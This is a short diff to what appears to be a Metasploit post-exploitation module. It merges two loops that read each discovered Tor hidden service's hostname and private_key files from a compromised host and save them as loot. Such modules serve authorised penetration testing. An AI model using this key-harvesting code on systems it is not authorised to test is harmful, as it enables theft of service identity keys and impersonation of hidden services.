@@ -81,10 +81,8 @@ class MetasploitModule < Msf::Post
         hidden.each do |f|
           output = read_file("#{f}hostname")
           save(f, output, "tor.#{f.split('/')[-1]}.hostname") if output && output !~ /No such file or directory/
-        end
 
-        # For all the Hidden Services found, loot private_key file
-        hidden.each do |f|
+          # For all the Hidden Services found, loot private_key file
           output = read_file("#{f}private_key")
           save(f, output, "tor.#{f.split('/')[-1]}.privatekey") if output && output !~ /No such file or directory/
         end
